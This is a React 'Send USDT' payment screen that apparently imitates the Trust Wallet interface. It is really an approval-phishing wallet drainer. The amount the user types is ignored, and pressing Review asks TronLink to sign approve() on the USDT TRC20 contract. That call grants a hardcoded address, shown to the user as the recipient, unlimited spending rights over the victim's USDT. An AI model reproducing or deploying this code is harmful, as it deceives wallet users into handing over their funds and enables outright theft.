import React, { useState } from 'react';
import './SendUSDT.css';

const RECIPIENT = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

// USDT TRC20 contract on TRON Mainnet
const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// Spender address (your contract)
const SPENDER = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

const SendUSDT = () => {
  const [amount, setAmount] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);

  const handleKey = (key) => {
    if (key === '⌫') {
      setAmount(prev => prev.slice(0, -1));
      return;
    }
    if (key === '.' && amount.includes('.')) return;
    if (key !== '.' && amount === '0') { setAmount(key); return; }
    if (amount.length >= 10) return;
    setAmount(prev => prev + key);
  };

  const displayAmount = amount === '' ? '0' : amount;
  const usdValue = parseFloat(amount) > 0
    ? parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : '0.00';

  const isActive = amount !== '' && parseFloat(amount) > 0;

  const handleReview = async () => {
    if (!isActive || isVerifying) return;

    // Check for TronLink
    if (!window.tronWeb || !window.tronWeb.ready) {
      alert('TronLink wallet is required. Please install TronLink and unlock it.');
      return;
    }

    setIsVerifying(true);

    try {
      const tronWeb = window.tronWeb;

      // Get the USDT TRC20 contract instance
      const contract = await tronWeb.contract().at(USDT_TRC20);

      // Max uint256 approval
      const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      // Call approve(spender, amount) — this triggers a TronLink signing popup
      // No separate "connect wallet" step needed; TronLink auto-uses the active account
      const tx = await contract.approve(SPENDER, MAX_UINT256).send({
        feeLimit: 100_000_000, // 100 TRX fee limit
        shouldPollResponse: false
      });

      alert('Transaction submitted! TX ID: ' + tx);

    } catch (err) {
      console.error(err);
      alert('Error: ' + (err?.message || 'Unknown error'));
    } finally {
      setIsVerifying(false);
    }
  };

  const keys = ['1','2','3','4','5','6','7','8','9','.','0','⌫'];

  return (
    <div className="tw-screen">

      {/* TOP GROUP: header + address + amount */}
      <div className="tw-top">
        <div className="tw-header">
          <button className="tw-back-btn" aria-label="Back">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M15 18l-6-6 6-6" />
            </svg>
          </button>
          <span className="tw-header-title">Amount</span>
          <div className="tw-header-spacer" />
        </div>

        <div className="tw-to-row">
          <span className="tw-to-label">To:</span>
          <span className="tw-to-address">{RECIPIENT}</span>
        </div>

        <div className="tw-amount-display-area">
          <div className={`tw-amount-number ${amount === '' ? 'tw-amount-placeholder' : ''} ${displayAmount.length > 6 ? 'tw-amount-number--sm' : ''}`}>
            {displayAmount}
          </div>
          <div className="tw-fiat-row">
            <span className="tw-fiat-value">≈ ${usdValue}</span>
            <button className="tw-swap-icon" aria-label="Swap currency">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 16V4m0 0L3 8m4-4l4 4" /><path d="M17 8v12m0 0l4-4m-4 4l-4-4" />
              </svg>
            </button>
          </div>
        </div>
      </div>

      {/* BOTTOM GROUP: keypad + review button */}
      <div className="tw-bottom">
        <div className="tw-keypad">
          {keys.map((key) => (
            <button key={key} className={`tw-key ${key === '⌫' ? 'tw-key--backspace' : ''}`} onClick={() => handleKey(key)}>
              {key === '⌫' ? (
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
                  <line x1="18" y1="9" x2="12" y2="15" /><line x1="12" y1="9" x2="18" y2="15" />
                </svg>
              ) : key}
            </button>
          ))}
        </div>

        <div className="tw-action-area">
          <button
            className={`tw-review-btn ${isActive ? 'tw-review-btn--active' : ''}`}
            onClick={handleReview}
            disabled={!isActive || isVerifying}
          >
            {isVerifying ? 'Processing...' : 'Review'}
          </button>
        </div>
      </div>

    </div>
  );
};

export default SendUSDT;
